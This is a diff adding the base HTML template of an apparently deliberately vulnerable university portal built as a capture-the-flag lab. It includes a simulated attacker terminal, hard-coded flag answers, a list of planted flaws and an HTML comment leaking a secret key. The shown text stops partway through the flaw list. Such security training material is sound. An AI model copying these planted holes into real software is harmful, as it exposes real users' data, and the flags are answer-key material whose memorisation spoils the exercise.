@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vidyatech University — {% block title %}Portal{% endblock %}</title>
+  <!-- Internal config — do not share -->
+  <!-- secret_key: vidyatech@2024secret | db: sqlite:///data/vidyatech.db -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary:   #1a3a5c;
+      --primary-d: #112844;
+      --accent:    #c8860a;
+      --accent-l:  #f5a623;
+      --bg:        #f7f5f0;
+      --bg2:       #ffffff;
+      --border:    #e2ddd6;
+      --text:      #1c1c1c;
+      --muted:     #6b6560;
+      --green:     #2d7a4f;
+      --red:       #b03030;
+      --card-sh:   0 2px 12px rgba(26,58,92,0.08);
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'DM Sans', sans-serif;
+      font-size: 15px;
+      line-height: 1.65;
+    }
+
+    /* ── TOP BAR ── */
+    .topbar {
+      background: var(--primary-d);
+      color: rgba(255,255,255,0.7);
+      font-size: 12px;
+      padding: 6px 0;
+      border-bottom: 2px solid var(--accent);
+    }
+    .topbar-inner {
+      max-width: 1200px; margin: 0 auto; padding: 0 2rem;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .topbar a { color: rgba(255,255,255,0.7); text-decoration: none; margin-left: 1rem; }
+    .topbar a:hover { color: #fff; }
+
+    /* ── HEADER ── */
+    header {
+      background: var(--primary);
+      color: #fff;
+      padding: 1rem 0;
+    }
+    .header-inner {
+      max-width: 1200px; margin: 0 auto; padding: 0 2rem;
+      display: flex; align-items: center; gap: 1.25rem;
+    }
+    .logo-circle {
+      width: 56px; height: 56px; border-radius: 50%;
+      background: var(--accent);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px; font-weight: 700; color: #fff;
+      flex-shrink: 0;
+      font-family: 'Playfair Display', serif;
+    }
+    .logo-text { line-height: 1.2; }
+    .logo-text h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 22px; font-weight: 700; color: #fff;
+    }
+    .logo-text p { font-size: 12px; color: rgba(255,255,255,0.65); }
+
+    /* ── NAV ── */
+    nav {
+      background: #fff;
+      border-bottom: 3px solid var(--accent);
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      position: sticky; top: 0; z-index: 100;
+    }
+    .nav-inner {
+      max-width: 1200px; margin: 0 auto; padding: 0 2rem;
+      display: flex; align-items: center; gap: 2px;
+    }
+    .nav-inner a {
+      color: var(--primary);
+      text-decoration: none;
+      padding: 14px 16px;
+      font-size: 14px;
+      font-weight: 500;
+      border-bottom: 3px solid transparent;
+      margin-bottom: -3px;
+      transition: all 0.2s;
+      white-space: nowrap;
+    }
+    .nav-inner a:hover { color: var(--accent); border-bottom-color: var(--accent); }
+    .nav-inner a.active { color: var(--accent); border-bottom-color: var(--accent); }
+    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 8px; }
+    .btn-nav-login {
+      background: var(--primary);
+      color: #fff !important;
+      padding: 8px 18px !important;
+      border-radius: 4px;
+      font-size: 13px !important;
+      border-bottom: none !important;
+    }
+    .btn-nav-login:hover { background: var(--primary-d) !important; border-bottom: none !important; }
+    .btn-nav-accent {
+      background: var(--accent);
+      color: #fff !important;
+      padding: 8px 18px !important;
+      border-radius: 4px;
+      font-size: 13px !important;
+      border-bottom: none !important;
+    }
+
+    /* ── CONTAINERS ── */
+    .container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; }
+    .page { padding: 2.5rem 0 4rem; }
+    .page-header {
+      background: linear-gradient(135deg, var(--primary) 0%, #264d7a 100%);
+      color: #fff; padding: 2.5rem 0;
+      margin-bottom: 2.5rem;
+    }
+    .page-header h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 30px; margin-bottom: 0.25rem;
+    }
+    .page-header p { color: rgba(255,255,255,0.75); font-size: 14px; }
+
+    /* ── CARDS ── */
+    .card {
+      background: #fff;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.5rem;
+      box-shadow: var(--card-sh);
+    }
+    .card-accent { border-top: 3px solid var(--accent); }
+    .card-blue   { border-top: 3px solid var(--primary); }
+
+    /* ── BUTTONS ── */
+    .btn {
+      display: inline-block;
+      padding: 9px 22px;
+      border-radius: 4px;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      border: none;
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+    .btn-primary { background: var(--primary); color: #fff; }
+    .btn-primary:hover { background: var(--primary-d); }
+    .btn-accent  { background: var(--accent); color: #fff; }
+    .btn-accent:hover { background: #a0680a; }
+    .btn-outline { background: transparent; color: var(--primary); border: 1.5px solid var(--primary); }
+    .btn-outline:hover { background: var(--primary); color: #fff; }
+    .btn-sm { padding: 6px 14px; font-size: 13px; }
+
+    /* ── FORMS ── */
+    input, textarea, select {
+      background: #fff;
+      border: 1.5px solid var(--border);
+      color: var(--text);
+      padding: 10px 14px;
+      border-radius: 5px;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 14px;
+      width: 100%;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus, textarea:focus, select:focus { border-color: var(--primary); }
+    label { font-size: 13px; color: var(--muted); display: block; margin-bottom: 5px; font-weight: 500; }
+    .form-group { margin-bottom: 1.1rem; }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+
+    /* ── ALERTS ── */
+    .alert {
+      padding: 11px 16px;
+      border-radius: 5px;
+      margin-bottom: 1rem;
+      font-size: 14px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .alert-error   { background: #fef2f2; border: 1px solid #fca5a5; color: #b91c1c; }
+    .alert-success { background: #f0fdf4; border: 1px solid #86efac; color: #15803d; }
+    .alert-info    { background: #eff6ff; border: 1px solid #93c5fd; color: #1d4ed8; }
+    .alert-warn    { background: #fffbeb; border: 1px solid #fcd34d; color: #92400e; }
+
+    /* ── GRID ── */
+    .grid-2 { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 1.5rem; }
+    .grid-3 { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; }
+    .grid-4 { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1rem; }
+
+    /* ── TABLE ── */
+    .table-wrap { overflow-x: auto; }
+    table { width: 100%; border-collapse: collapse; }
+    th {
+      text-align: left; padding: 11px 14px;
+      font-size: 12px; font-weight: 600;
+      color: var(--muted);
+      background: var(--bg);
+      border-bottom: 2px solid var(--border);
+      text-transform: uppercase; letter-spacing: 0.4px;
+    }
+    td { padding: 11px 14px; border-bottom: 1px solid var(--border); font-size: 14px; }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: #fafaf8; }
+
+    /* ── HEADINGS ── */
+    h1 { font-family: 'Playfair Display', serif; font-weight: 700; }
+    h2 { font-family: 'Playfair Display', serif; font-size: 22px; font-weight: 600; margin-bottom: 1rem; color: var(--primary); }
+    h3 { font-size: 17px; font-weight: 600; margin-bottom: 0.5rem; color: var(--primary); }
+
+    /* ── BADGE ── */
+    .badge {
+      display: inline-block; padding: 3px 10px;
+      border-radius: 20px; font-size: 12px; font-weight: 600;
+    }
+    .badge-blue   { background: #e0eaf5; color: var(--primary); }
+    .badge-green  { background: #dcfce7; color: var(--green); }
+    .badge-amber  { background: #fef3c7; color: #92400e; }
+    .badge-red    { background: #fee2e2; color: var(--red); }
+    .badge-gray   { background: #f3f4f6; color: #374151; }
+
+    /* ── NOTICE CARD ── */
+    .notice-card {
+      background: #fff; border: 1px solid var(--border);
+      border-left: 4px solid var(--accent);
+      border-radius: 0 6px 6px 0;
+      padding: 1rem 1.25rem;
+      transition: box-shadow 0.2s;
+    }
+    .notice-card:hover { box-shadow: var(--card-sh); }
+    .notice-title { font-weight: 600; font-size: 15px; margin-bottom: 4px; }
+    .notice-meta  { font-size: 12px; color: var(--muted); }
+
+    /* ── STAT CARD ── */
+    .stat-card {
+      background: #fff; border: 1px solid var(--border);
+      border-radius: 8px; padding: 1.25rem;
+      display: flex; align-items: center; gap: 1rem;
+      box-shadow: var(--card-sh);
+    }
+    .stat-icon {
+      width: 48px; height: 48px; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px; flex-shrink: 0;
+    }
+    .stat-num  { font-size: 26px; font-weight: 700; line-height: 1; color: var(--primary); }
+    .stat-label { font-size: 13px; color: var(--muted); margin-top: 2px; }
+
+    /* ── DIVIDER ── */
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+
+    /* ── FOOTER ── */
+    footer {
+      background: var(--primary-d);
+      color: rgba(255,255,255,0.65);
+      padding: 3rem 0 1.5rem;
+      margin-top: 4rem;
+    }
+    .footer-grid {
+      max-width: 1200px; margin: 0 auto; padding: 0 2rem;
+      display: grid; grid-template-columns: 2fr 1fr 1fr 1fr;
+      gap: 2rem; margin-bottom: 2rem;
+    }
+    .footer-brand h2 {
+      font-family: 'Playfair Display', serif;
+      color: #fff; font-size: 18px; margin-bottom: 0.5rem;
+    }
+    footer h4 { color: #fff; font-size: 13px; font-weight: 600; margin-bottom: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; }
+    footer ul { list-style: none; }
+    footer ul li { margin-bottom: 6px; }
+    footer ul li a { color: rgba(255,255,255,0.55); text-decoration: none; font-size: 13px; }
+    footer ul li a:hover { color: #fff; }
+    .footer-bottom {
+      max-width: 1200px; margin: 0 auto; padding: 1.25rem 2rem 0;
+      border-top: 1px solid rgba(255,255,255,0.1);
+      display: flex; justify-content: space-between;
+      font-size: 12px; color: rgba(255,255,255,0.4);
+    }
+
+    /* ── UTIL ── */
+    .text-muted   { color: var(--muted); }
+    .text-primary { color: var(--primary); }
+    .text-accent  { color: var(--accent); }
+    .mt-1 { margin-top: 0.5rem; }
+    .mt-2 { margin-top: 1rem; }
+    .mt-3 { margin-top: 1.5rem; }
+    .mb-2 { margin-bottom: 1rem; }
+    code { background: #f1f0eb; border: 1px solid var(--border); padding: 2px 6px; border-radius: 3px; font-size: 12px; }
+  </style>
+  {% block head %}{% endblock %}
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <div class="topbar">
+    <div class="topbar-inner">
+      <span>Accredited by NAAC Grade A+ | Established 1994</span>
+      <div>
+        <a href="/contact">Contact Us</a>
+        <a href="/staff/login">Staff Login</a>
+        <a href="/admin/login">Admin Login</a>
+        <a href="/resources">Resources</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header>
+    <div class="header-inner">
+      <div class="logo-circle">VU</div>
+      <div class="logo-text">
+        <h1>Vidyatech University</h1>
+        <p>Knowledge · Innovation · Excellence</p>
+      </div>
+      {% if session.get('user') %}
+      <div style="margin-left:auto; text-align:right;">
+        <p style="font-size:13px; color:rgba(255,255,255,0.7);">Welcome,</p>
+        <p style="font-weight:600; font-size:15px;">{{ session.user.name }}</p>
+      </div>
+      {% endif %}
+    </div>
+  </header>
+
+  <!-- Nav -->
+  <nav>
+    <div class="nav-inner">
+      <a href="/" {% if request.path == '/' %}class="active"{% endif %}>Home</a>
+      <a href="/about" {% if request.path == '/about' %}class="active"{% endif %}>About</a>
+      <a href="/notices" {% if request.path.startswith('/notices') %}class="active"{% endif %}>Notices</a>
+      <a href="/events" {% if request.path == '/events' %}class="active"{% endif %}>Events</a>
+      <a href="/resources" {% if request.path == '/resources' %}class="active"{% endif %}>Resources</a>
+      <a href="/tools/nslookup" {% if request.path.startswith('/tools') %}class="active"{% endif %}>IT Tools</a>
+      <a href="/contact" {% if request.path == '/contact' %}class="active"{% endif %}>Contact</a>
+      <div class="nav-right">
+        {% if session.get('user') %}
+          {% if session.get('role') == 'student' %}
+            <a href="/dashboard">My Portal</a>
+            <a href="/results">Results</a>
+            <a href="/account/update-email">Account</a>
+
+          {% elif session.get('role') == 'admin' %}
+            <a href="/admin">Admin</a>
+          {% elif session.get('role') == 'faculty' %}
+            <a href="/faculty">Faculty</a>
+          {% endif %}
+          <a href="{% if session.get('role') == 'student' %}/logout{% else %}/staff/logout{% endif %}" class="btn-nav-login">Logout</a>
+        {% else %}
+          <a href="/login" class="btn-nav-login">Student Login</a>
+        {% endif %}
+      </div>
+    </div>
+  </nav>
+
+  <main>
+    {% block content %}{% endblock %}
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <h2>Vidyatech University</h2>
+        <p style="font-size:13px; line-height:1.7;">Shaping future engineers and innovators since 1994. Accredited by NAAC Grade A+ and approved by AICTE.</p>
+        <p style="font-size:12px; margin-top:0.75rem;">📍 Vidyatech Campus, Tech Nagar, Bangalore - 560001</p>
+      </div>
+      <div>
+        <h4>Academics</h4>
+        <ul>
+          <li><a href="#">Departments</a></li>
+          <li><a href="/resources">Resources</a></li>
+          <li><a href="/results">Results</a></li>
+          <li><a href="#">Timetable</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Student Life</h4>
+        <ul>
+          <li><a href="/events">Events</a></li>
+          <li><a href="/notices">Notices</a></li>
+          <li><a href="#">Clubs</a></li>
+          <li><a href="#">Hostel</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Quick Links</h4>
+        <ul>
+          <li><a href="/login">Student Portal</a></li>
+          <li><a href="/staff/login">Staff Portal</a></li>
+          <li><a href="/admin/login">Admin Portal</a></li>
+          <li><a href="/about">About Us</a></li>
+          <li><a href="/contact">Contact</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2024 Vidyatech University. All rights reserved.</span>
+      <span>Privacy Policy | Terms of Use | NIRF</span>
+    </div>
+  </footer>
+
+  <!-- ═══════════════════════════════════════════════════
+       BUILT-IN TERMINAL DRAWER
+       Toggle with the floating button bottom-right
+  ════════════════════════════════════════════════════ -->
+
+  <style>
+    /* Floating toggle button */
+    #term-toggle {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 9998;
+      background: #0d1117;
+      border: 1.5px solid #30363d;
+      color: #3fb950;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 10px 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+      transition: border-color .2s, background .2s;
+      user-select: none;
+    }
+    #term-toggle:hover { border-color: #3fb950; background: #161b22; }
+    #term-toggle .tgl-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #3fb950;
+      animation: tpulse 1.8s infinite;
+    }
+    @keyframes tpulse { 0%,100%{opacity:1} 50%{opacity:.25} }
+    #term-toggle .tgl-score {
+      font-size: 11px;
+      color: #e3b341;
+      background: rgba(227,179,65,0.1);
+      border: 1px solid rgba(227,179,65,0.25);
+      padding: 1px 6px;
+      border-radius: 3px;
+      display: none;
+    }
+    #term-toggle .tgl-score.show { display: inline-block; }
+
+    /* Terminal drawer */
+    #term-drawer {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: 360px;
+      background: #0d1117;
+      border-top: 2px solid #238636;
+      z-index: 9997;
+      display: flex;
+      flex-direction: column;
+      transform: translateY(100%);
+      transition: transform 0.3s cubic-bezier(.4,0,.2,1);
+      box-shadow: 0 -8px 32px rgba(0,0,0,0.5);
+    }
+    #term-drawer.open { transform: translateY(0); }
+
+    /* Resize handle */
+    #term-resize {
+      height: 5px;
+      background: #21262d;
+      cursor: ns-resize;
+      flex-shrink: 0;
+      transition: background .15s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #term-resize:hover { background: #238636; }
+    #term-resize::after {
+      content: '';
+      width: 40px; height: 2px;
+      background: #30363d;
+      border-radius: 2px;
+    }
+
+    /* Terminal top bar */
+    #term-bar {
+      display: flex;
+      align-items: center;
+      background: #161b22;
+      border-bottom: 1px solid #21262d;
+      padding: 0 14px;
+      height: 38px;
+      flex-shrink: 0;
+      gap: 10px;
+    }
+    .t-tl { display: flex; gap: 5px; }
+    .t-tl span {
+      width: 11px; height: 11px; border-radius: 50%; cursor: pointer;
+    }
+    .t-close { background: #ff5f57; }
+    .t-close:hover { opacity: .8; }
+    .t-min   { background: #ffbd2e; }
+    .t-max   { background: #28c940; }
+
+    .t-tabs { display: flex; gap: 2px; flex: 1; overflow-x: auto; }
+    .t-tab {
+      padding: 4px 14px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: #8b949e;
+      border: 1px solid transparent;
+      border-bottom: none;
+      border-radius: 5px 5px 0 0;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: all .15s;
+      margin-bottom: -1px;
+    }
+    .t-tab.active {
+      background: #0d1117;
+      border-color: #30363d;
+      color: #f0f6fc;
+    }
+    .t-tab:hover:not(.active) { color: #c9d1d9; }
+    .t-tab-new {
+      padding: 4px 10px;
+      font-size: 15px;
+      color: #8b949e;
+      cursor: pointer;
+      border-radius: 4px;
+      line-height: 1;
+      transition: color .15s;
+    }
+    .t-tab-new:hover { color: #f0f6fc; background: #21262d; }
+
+    .t-actions { display: flex; gap: 6px; align-items: center; }
+    .t-btn {
+      background: transparent;
+      border: 1px solid #30363d;
+      color: #8b949e;
+      padding: 3px 10px;
+      border-radius: 4px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: all .15s;
+    }
+    .t-btn:hover { border-color: #8b949e; color: #c9d1d9; }
+
+    /* Output area */
+    #term-out {
+      flex: 1;
+      overflow-y: auto;
+      padding: 10px 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.85;
+      color: #c9d1d9;
+    }
+    #term-out::-webkit-scrollbar { width: 5px; }
+    #term-out::-webkit-scrollbar-track { background: transparent; }
+    #term-out::-webkit-scrollbar-thumb { background: #21262d; border-radius: 3px; }
+
+    .tl { word-break: break-all; }
+    .tl.cmd     { color: #f0f6fc; }
+    .tl.prompt  { color: #3fb950; }
+    .tl.out     { color: #c9d1d9; }
+    .tl.ok      { color: #3fb950; }
+    .tl.err     { color: #f85149; }
+    .tl.warn    { color: #e3b341; }
+    .tl.info    { color: #58a6ff; }
+    .tl.flag    { display:inline-block; color:#e3b341; font-weight:600; background:rgba(227,179,65,0.1); border:1px solid rgba(227,179,65,0.3); padding:1px 8px; border-radius:3px; margin:2px 0; }
+    .tl.muted   { color: #484f58; }
+    .tl.banner  { color: #58a6ff; font-size: 11px; }
+
+    /* Input row */
+    #term-input-row {
+      display: flex;
+      align-items: center;
+      padding: 7px 14px;
+      border-top: 1px solid #21262d;
+      background: #0d1117;
+      gap: 8px;
+      flex-shrink: 0;
+    }
+    #t-prompt-lbl {
+      color: #3fb950;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      white-space: nowrap;
+      flex-shrink: 0;
+      user-select: none;
+    }
+    #t-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: #f0f6fc;
+      caret-color: #3fb950;
+    }
+    #t-input::placeholder { color: #484f58; }
+
+    /* Score pill */
+    #score-pill {
+      position: fixed;
+      bottom: 24px;
+      right: 200px;
+      z-index: 9998;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 7px 14px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      display: none;
+      gap: 12px;
+      align-items: center;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.35);
+    }
+    #score-pill.show { display: flex; }
+    .sp-r { color: #f85149; }
+    .sp-b { color: #58a6ff; }
+    .sp-sep { color: #30363d; }
+  </style>
+
+  <!-- Score pill (shows after first exploit) -->
+  <div id="score-pill">
+    <span class="sp-r">&#9670; Red: <strong id="sp-red">0</strong> pts</span>
+    <span class="sp-sep">|</span>
+    <span class="sp-b">&#9670; Blue: <strong id="sp-blue">0</strong> pts</span>
+  </div>
+
+  <!-- Floating toggle -->
+  <div id="term-toggle" onclick="toggleTerm()">
+    <div class="tgl-dot"></div>
+    <span id="tgl-label">Terminal</span>
+    <span class="tgl-score" id="tgl-score">0 pts</span>
+  </div>
+
+  <!-- Terminal drawer -->
+  <div id="term-drawer">
+    <div id="term-resize"></div>
+
+    <div id="term-bar">
+      <div class="t-tl">
+        <span class="t-close" title="Close" onclick="closeTerm()"></span>
+        <span class="t-min"   title="Minimize" onclick="closeTerm()"></span>
+        <span class="t-max"   title="Toggle size" onclick="toggleSize()"></span>
+      </div>
+      <div class="t-tabs" id="t-tabs">
+        <div class="t-tab active" data-id="1" onclick="switchTTab(1)">kali@vidyatech: ~</div>
+        <div class="t-tab-new" onclick="addTTab()" title="New terminal">+</div>
+      </div>
+      <div class="t-actions">
+        <button class="t-btn" onclick="clearTerm()">Clear</button>
+        <button class="t-btn" onclick="document.getElementById('t-input').focus()">Focus</button>
+      </div>
+    </div>
+
+
+
+    <div id="term-out" onclick="document.getElementById('t-input').focus()"></div>
+
+    <div id="term-input-row">
+      <span id="t-prompt-lbl">kali@vidyatech:~$</span>
+      <input id="t-input" type="text" autocomplete="off" spellcheck="false"
+             placeholder="type a command..."
+             onkeydown="tHandleKey(event)">
+    </div>
+  </div>
+
+  <script>
+  // ── STATE ──────────────────────────────────────────────────────────────────
+  const T = {
+    history: [], histIdx: -1,
+    exploited: new Set(),
+    score: {red:0, blue:0},
+    tabCount: 1, activeTab: 1,
+    drawerOpen: false,
+    drawerFullscreen: false,
+    FLAGS: {
+      1:'VT{sql_inj3ction_login_bypass}',   2:'VT{stored_xss_n0tice_b0ard}',
+      3:'VT{d3fault_cr3ds_staff_portal}',   4:'VT{dir_trav3rsal_file_l3ak}',
+      5:'VT{s3nsitive_data_3xpos3d}',       6:'VT{jwt_alg_n0ne_forg3d}',
+      7:'VT{id0r_r3sult_l3ak}',             8:'VT{cmd_inj3ction_nsl00kup}',
+      9:'VT{f1le_upl0ad_websh3ll}',         10:'VT{csrf_3mail_hij4ck}'
+    }
+  };
+
+  // ── DRAWER ────────────────────────────────────────────────────────────────
+  function toggleTerm() {
+    T.drawerOpen = !T.drawerOpen;
+    document.getElementById('term-drawer').classList.toggle('open', T.drawerOpen);
+    document.getElementById('tgl-label').textContent = T.drawerOpen ? 'Close Terminal' : 'Terminal';
+    if (T.drawerOpen) {
+      document.getElementById('t-input').focus();
+      if (document.getElementById('term-out').children.length === 0) bootTerm();
+    }
+  }
+  function closeTerm() {
+    T.drawerOpen = false;
+    document.getElementById('term-drawer').classList.remove('open');
+    document.getElementById('tgl-label').textContent = 'Terminal';
+  }
+  function toggleSize() {
+    T.drawerFullscreen = !T.drawerFullscreen;
+    document.getElementById('term-drawer').style.height = T.drawerFullscreen ? '80vh' : '360px';
+  }
+
+  // ── OUTPUT ────────────────────────────────────────────────────────────────
+  function tLine(txt, cls='out') {
+    const out = document.getElementById('term-out');
+    const d = document.createElement('div');
+    d.className = 'tl ' + cls;
+    d.innerHTML = txt;
+    out.appendChild(d);
+    out.scrollTop = out.scrollHeight;
+  }
+  function tLines(arr) { arr.forEach(l => tLine(l.v, l.t||'out')); }
+  function tPrompt(cmd) {
+    tLine('<span style="color:#3fb950">kali@vidyatech:~$</span> <span style="color:#f0f6fc">' + esc(cmd) + '</span>', 'prompt');
+  }
+  function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  function clearTerm() { document.getElementById('term-out').innerHTML = ''; }
+
+  function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+  async function typeLines(arr, vulnNum, pts) {
+    for (const l of arr) {
+      await sleep(60 + Math.random()*50);
+      tLine(l.v, l.t||'out');
+    }
+    if (vulnNum && !T.exploited.has(vulnNum)) {
+      T.exploited.add(vulnNum);
+      T.score.red += pts;
+      updateScore();
+      await sleep(200);
+      tLine(T.FLAGS[vulnNum], 'flag');
+      tLine('[+] Vuln #'+vulnNum+' exploited! +'+pts+' pts added to Red Team', 'ok');
+    }
+  }
+
+  function updateScore() {
+    document.getElementById('sp-red').textContent  = T.score.red;
+    document.getElementById('sp-blue').textContent = T.score.blue;
+    document.getElementById('score-pill').classList.add('show');
+    const sc = document.getElementById('tgl-score');
+    sc.textContent = 'Red: '+T.score.red;
+    sc.classList.add('show');
+  }
+
+  // ── BOOT ──────────────────────────────────────────────────────────────────
+  function bootTerm() {
+    // clean start — no output
+  }
+
+  // ── KEY HANDLER ───────────────────────────────────────────────────────────
+  function tHandleKey(e) {
+    const inp = document.getElementById('t-input');
+    if (e.key === 'Enter') {
+      const cmd = inp.value.trim();
+      if (!cmd) return;
+      T.history.unshift(cmd); T.histIdx = -1; inp.value = '';
+      tPrompt(cmd);
+      tLine('','out');
+      runTCmd(cmd);
+      tLine('','out');
+    } else if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (T.histIdx < T.history.length-1) inp.value = T.history[++T.histIdx];
+    } else if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      T.histIdx > 0 ? inp.value = T.history[--T.histIdx] : (T.histIdx=-1, inp.value='');
+    } else if (e.key === 'Tab') {
+      e.preventDefault();
+      const cmds = ['help','vulns','exploit','sqlmap','hydra','curl','nmap','nikto','jwt','score','clear','whoami','flag','python3','cat','ping'];
+      const m = cmds.filter(c=>c.startsWith(inp.value));
+      if (m.length===1) inp.value=m[0]+' ';
+      else if (m.length>1) tLine(m.join('  '), 'muted');
+    } else if (e.key==='l' && e.ctrlKey) {
+      e.preventDefault(); clearTerm();
+    }
+  }
+
+
+  // ── COMMAND ROUTER ────────────────────────────────────────────────────────
+  function runTCmd(raw) {
+    fetch('/api/terminal_log', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'cmd=' + encodeURIComponent(raw.trim())
+    }).catch(e => console.error(e));
+
+    const p = raw.trim().split(/\s+/);
+    const c = p[0].toLowerCase();
+    const a = p.slice(1);
+    const map = {
+      help:cmdHelp, vulns:cmdVulns, clear:clearTerm, cls:clearTerm,
+      whoami:()=>tLine('kali (uid=1000, groups=sudo,kali)','ok'),
+      pwd:  ()=>tLine('/home/kali/Desktop','out'),
+      id:   ()=>tLine('uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo)','ok'),
+      date: ()=>tLine(new Date().toString(),'out'),
+      ls:   ()=>tLine('tools/  exploits/  flags/  loot/  notes.txt','out'),
+      score:cmdScore,
+      exploit:()=>cmdExploit(a),
+      flag: ()=>cmdFlag(a),
+      curl: ()=>cmdCurl(a),
+      sqlmap:()=>cmdSqlmap(a),
+      hydra: ()=>cmdHydra(a),
+      nmap:  ()=>cmdNmap(a),
+      nikto: ()=>cmdNikto(a),
+      jwt:   ()=>cmdJwt(a),
+      python3:()=>cmdPy(a),
+      ping:  ()=>tLine('PING localhost: 64 bytes from 127.0.0.1 ttl=64 time=0.04ms','out'),
+      echo:  ()=>tLine(a.join(' '),'out'),
+      cat:   ()=>cmdCat(a),
+      ifconfig:()=>tLine('eth0: inet 10.10.14.5  netmask 255.255.254.0','out'),
+      uname:()=>tLine('Linux kali 6.1.0-kali5-amd64 x86_64 GNU/Linux','out'),
+    };
+    if (map[c]) map[c]();
+    else { tLine('bash: '+c+': command not found','err'); tLine("Type 'help' for available commands",'muted'); }
+  }
+
+  // ── COMMANDS ──────────────────────────────────────────────────────────────
+  function cmdHelp() {
+    tLines([
+      {t:'info',  v:'Commands:'},
+      {t:'ok',    v:'  vulns              list all vulnerabilities'},
+      {t:'ok',    v:'  exploit &lt;1-12&gt;     run exploit walkthrough'},
+      {t:'ok',    v:'  flag &lt;1-12&gt;        show flag (after exploit)'},
+      {t:'ok',    v:'  score              current scoreboard'},
+      {t:'muted', v:''},
+      {t:'info',  v:'Tools (type full command manually):'},
+      {t:'out',   v:'  sqlmap -u &lt;url&gt; [options]'},
+      {t:'out',   v:'  hydra -l &lt;user&gt; -P &lt;wordlist&gt; &lt;target&gt;'},
+      {t:'out',   v:'  curl &lt;url&gt; [-H &lt;header&gt;] [-d &lt;data&gt;]'},
+      {t:'out',   v:'  nmap &lt;host&gt; [-p &lt;ports&gt;] [-sV]'},
+      {t:'out',   v:'  nikto -h &lt;url&gt;'},
+      {t:'out',   v:'  jwt decode &lt;token&gt;  |  jwt sign &lt;payload&gt; &lt;secret&gt;'},
+      {t:'out',   v:'  python3 -c &lt;code&gt;'},
+    ]);
+  }
+
+  function cmdVulns() {
+    tLines([
+      {t:'info',  v:'Vidyatech University — Active Vulnerabilities'},
+      {t:'muted', v:'──────────────────────────────────────────────────────'},
+      {t:'ok',    v:'  #1   SQL Injection          /login                [Easy]'},
+      {t:'ok',    v:'  #2   Stored XSS             /notices/post         [Easy]'},
+      {t:'ok',    v:'  #3   Default Credentials    /staff/login          [Easy]'},
+      {t:'ok',    v:'  #4   Directory Traversal    /resources/download   [Easy]'},
+      {t:'ok',    v:'  #5   Sensitive Data Exposure /robots.txt /.env    [Easy]'},
+      {t:'ok',    v:'  #6   Hardcoded Admin Login   /admin/login         [Easy]'},
+      {t:'ok',    v:'  #7   Unrestricted File Upload /dashboard/upload-doc [Easy]'},
+      {t:'ok',    v:'  #8   Clickjacking            Any page             [Easy]'},
+      {t:'ok',    v:'  #9   Weak Password Policy    /account/change-password [Easy]'},
